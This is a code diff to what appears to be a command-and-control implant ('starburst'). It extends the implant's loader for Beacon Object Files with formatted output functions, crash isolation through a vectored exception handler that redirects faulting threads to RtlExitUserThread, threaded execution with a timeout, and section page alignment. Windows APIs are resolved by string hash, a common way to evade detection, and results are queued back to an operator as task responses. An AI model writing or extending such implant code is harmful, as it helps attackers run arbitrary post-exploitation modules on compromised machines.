@@ -101,20 +101,37 @@ static void __cdecl declfn beacon_printf( int type, const char* fmt, ... ) {
     auto inst = coff_get_inst();
     if ( !inst || !fmt ) return;
 
-    uint32_t len = 0;
-    auto p = fmt;
-    while ( *p ) { len++; p++; }
+    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
+    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
+        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );
+
+    char buf[2048];
+    int len;
+
+    if ( p_vsnprintf ) {
+        va_list args;
+        va_start( args, fmt );
+        len = p_vsnprintf( buf, sizeof(buf) - 1, fmt, args );
+        va_end( args );
+        if ( len < 0 ) len = sizeof(buf) - 1;
+        buf[len] = '\0';
+    } else {
+        len = 0;
+        auto s = fmt;
+        while ( *s && len < (int)sizeof(buf) - 1 ) buf[len++] = *s++;
+        buf[len] = '\0';
+    }
 
     auto& coff = inst->coff;
-    if ( coff.output_length + len + 2 > coff.output_capacity ) {
+    if ( coff.output_length + (uint32_t)len + 2 > coff.output_capacity ) {
         uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
-        while ( new_cap < coff.output_length + len + 2 ) new_cap *= 2;
+        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
         coff.output_data = static_cast<char*>(
             inst->heap_realloc( coff.output_data, new_cap ) );
         coff.output_capacity = new_cap;
     }
 
-    memory::copy( coff.output_data + coff.output_length, const_cast<char*>(fmt), len );
+    memory::copy( coff.output_data + coff.output_length, buf, len );
     coff.output_length += len;
     coff.output_data[coff.output_length] = '\0';
 }
@@ -224,7 +241,22 @@ static void __cdecl declfn beacon_format_append( formatp* fp, const char* buf, i
 }
 
 static void __cdecl declfn beacon_format_printf( formatp* fp, const char* fmt, ... ) {
-    (void)fp; (void)fmt;
+    auto inst = coff_get_inst();
+    if ( !inst || !fp || !fmt ) return;
+
+    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
+    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
+        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );
+    if ( !p_vsnprintf ) return;
+
+    int avail = fp->size - fp->length;
+    if ( avail <= 0 ) return;
+
+    va_list args;
+    va_start( args, fmt );
+    int written = p_vsnprintf( fp->buffer + fp->length, avail, fmt, args );
+    va_end( args );
+    if ( written > 0 ) fp->length += written;
 }
 
 static char* __cdecl declfn beacon_format_tostring( formatp* fp, int* size ) {
@@ -255,6 +287,74 @@ static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
 }
 
 } // extern "C"
+
+// read current thread ID from TEB
+static inline auto declfn get_current_tid() -> uint32_t {
+#ifdef _WIN64
+    uint32_t tid;
+    __asm__ volatile (
+        ".byte 0x65, 0x8b, 0x04, 0x25, 0x48, 0x00, 0x00, 0x00"
+        : "=a"(tid)
+    );
+    return tid;
+#else
+    uint32_t tid;
+    __asm__ volatile (
+        ".byte 0x64, 0x8b, 0x04, 0x25, 0x24, 0x00, 0x00, 0x00"
+        : "=a"(tid)
+    );
+    return tid;
+#endif
+}
+
+static auto WINAPI declfn bof_crash_handler(
+    EXCEPTION_POINTERS* ep ) -> LONG
+{
+    auto inst = coff_get_inst();
+    if ( !inst || !inst->coff.guard_active )
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    if ( get_current_tid() != inst->coff.bof_thread_id )
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    inst->coff.crash_code = ep->ExceptionRecord->ExceptionCode;
+    inst->coff.guard_active = 0;
+
+#ifdef _WIN64
+    ep->ContextRecord->Rcx = ep->ExceptionRecord->ExceptionCode;
+    ep->ContextRecord->Rip = inst->coff.exit_thread_addr;
+    ep->ContextRecord->Rsp &= ~0xFull;
+    ep->ContextRecord->Rsp -= 8;
+#else
+    ep->ContextRecord->Esp -= 4;
+    *reinterpret_cast<uint32_t*>( ep->ContextRecord->Esp ) =
+        ep->ExceptionRecord->ExceptionCode;
+    ep->ContextRecord->Eip = static_cast<uint32_t>( inst->coff.exit_thread_addr );
+#endif
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+struct bof_run_ctx {
+    void*     entry;
+    char*     args;
+    int       args_len;
+    instance* inst;
+};
+
+static DWORD WINAPI declfn bof_thread_fn( LPVOID param ) {
+    auto ctx = static_cast<bof_run_ctx*>( param );
+    coff_set_inst( ctx->inst );
+    ctx->inst->coff.bof_thread_id = get_current_tid();
+    ctx->inst->coff.guard_active = 1;
+
+    typedef void ( __cdecl *bof_entry )( char*, int );
+    auto fn = reinterpret_cast<bof_entry>( ctx->entry );
+    fn( ctx->args, ctx->args_len );
+
+    ctx->inst->coff.guard_active = 0;
+    return 0;
+}
 
 // FNV-1a hash for compile-time beacon API name matching
 static constexpr uint32_t _fnv1a( const char* s ) {
@@ -372,19 +472,29 @@ auto declfn starburst::cmd_execute_coff(
         return;
     }
 
-    // calculate total size: sections (16-byte aligned) + trampolines + IAT
+    // calculate total size: sections (page-aware aligned) + trampolines + IAT
     // trampolines: 12 bytes each (mov rax,imm64 + jmp rax), one per symbol max
     // IAT must be co-located so REL32 relocations from BOF code can reach it
+    //
+    // page-align after executable sections so VirtualProtect(RX) on .text
+    // does not accidentally make writable sections (.data/.bss) read-only
     uint32_t total_alloc = 0;
     uint32_t sec_offsets[256] = { 0 };
     uint32_t sec_sizes[256] = { 0 };
     for ( uint16_t i = 0; i < header->NumberOfSections && i < 256; i++ ) {
-        sec_offsets[i] = total_alloc;
         sec_sizes[i] = sections[i].SizeOfRawData;
         if ( sec_sizes[i] == 0 ) sec_sizes[i] = sections[i].VirtualSize;
         if ( sec_sizes[i] == 0 ) sec_sizes[i] = 64;
+
+        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
+             !( sections[i].Characteristics & 0x20000000 ) ) {
+            total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
+        }
+
+        sec_offsets[i] = total_alloc;
         total_alloc += ( sec_sizes[i] + 15 ) & ~15u;
     }
+    total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
     uint32_t tramp_offset = total_alloc;
     total_alloc += header->NumberOfSymbols * 12;
     uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
@@ -554,35 +664,94 @@ auto declfn starburst::cmd_execute_coff(
     inst.coff.output_data = static_cast<char*>( inst.heap_alloc( 4096 ) );
     inst.coff.output_length = 0;
     inst.coff.output_capacity = 4096;
+    inst.coff.crash_code = 0;
+    inst.coff.guard_active = 0;
     if ( inst.coff.output_data ) inst.coff.output_data[0] = '\0';
 
-    // save old ArbitraryUserPointer, set instance for beacon callbacks
-    instance* old_aup = coff_get_inst();
-    coff_set_inst( &inst );
+    // resolve VEH + ExitThread for crash isolation
+    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
+    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );
 
-    DBG_PRINT( inst, "COFF: calling entry at %p, args=%p len=%u\n",
-        entry_ptr, args_data, args_len );
+    inst.coff.exit_thread_addr = reinterpret_cast<uintptr_t>(
+        resolve::_api( inst.ntdll.handle,
+            expr::hash_string( "RtlExitUserThread" ) ) );
 
-    typedef void ( __cdecl *bof_entry )( char*, int );
-    auto go_fn = reinterpret_cast<bof_entry>( entry_ptr );
-    go_fn( reinterpret_cast<char*>( args_data ), args_len );
-
-    DBG_PRINT( inst, "COFF: entry returned\n" );
-
-    // restore ArbitraryUserPointer
-    coff_set_inst( old_aup );
-
-    // collect output
-    if ( inst.coff.output_data && inst.coff.output_length > 0 ) {
-        queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
-    } else {
-        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "executed (no output)" ) ) );
+    void* veh = nullptr;
+    if ( pAddVEH && inst.coff.exit_thread_addr ) {
+        veh = pAddVEH( 1,
+            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( bof_crash_handler ) );
     }
 
-    // cleanup
+    DBG_PRINT( inst, "COFF: calling entry at %p, args=%p len=%u veh=%p\n",
+        entry_ptr, args_data, args_len, veh );
+
+    bool bof_ok = false;
+
+    bof_run_ctx bctx = { entry_ptr,
+        reinterpret_cast<char*>( args_data ), static_cast<int>( args_len ), &inst };
+
+    HANDLE h_bof = inst.kernel32.CreateThread(
+        nullptr, 0,
+        reinterpret_cast<LPTHREAD_START_ROUTINE>( bof_thread_fn ),
+        &bctx, 0, nullptr );
+
+    if ( h_bof ) {
+        DWORD wait = inst.kernel32.WaitForSingleObject( h_bof, 60000 );
+        DWORD exit_code = 0;
+        inst.kernel32.GetExitCodeThread( h_bof, &exit_code );
+
+        if ( wait == WAIT_TIMEOUT ) {
+            inst.kernel32.TerminateThread( h_bof, 1 );
+            DBG_PRINT( inst, "COFF: BOF timed out after 60s\n" );
+        } else if ( exit_code == 0 ) {
+            bof_ok = true;
+        } else {
+            DBG_PRINT( inst, "COFF: BOF crashed with 0x%08X\n", exit_code );
+        }
+
+        inst.kernel32.CloseHandle( h_bof );
+    } else {
+        instance* old_aup = coff_get_inst();
+        coff_set_inst( &inst );
+
+        typedef void ( __cdecl *bof_entry )( char*, int );
+        auto go_fn = reinterpret_cast<bof_entry>( entry_ptr );
+        go_fn( reinterpret_cast<char*>( args_data ), args_len );
+
+        coff_set_inst( old_aup );
+        bof_ok = true;
+    }
+
+    if ( veh && pRemoveVEH )
+        pRemoveVEH( veh );
+
+    DBG_PRINT( inst, "COFF: done ok=%d crash=0x%08X\n", bof_ok, inst.coff.crash_code );
+
+    if ( bof_ok && inst.coff.output_data && inst.coff.output_length > 0 ) {
+        queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
+    } else if ( bof_ok ) {
+        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
+            symbol<char*>( const_cast<char*>( "executed (no output)" ) ) );
+    } else if ( inst.coff.crash_code ) {
+        char err[32] = { 'B','O','F',' ','c','r','a','s','h',':',' ','0','x' };
+        uint32_t code = inst.coff.crash_code;
+        for ( int d = 7; d >= 0; d-- ) {
+            uint32_t n = ( code >> ( d * 4 ) ) & 0xF;
+            err[13 + (7 - d)] = n < 10 ? '0' + n : 'A' + n - 10;
+        }
+        err[21] = '\0';
+        queue_response( inst, task_uuid, RESPONSE_ERROR, err );
+    } else {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "BOF timed out" ) ) );
+    }
+
     if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
-    inst.coff = { nullptr, 0, 0 };
+    inst.coff = {};
 
     inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
     inst.heap_free( section_ptrs );
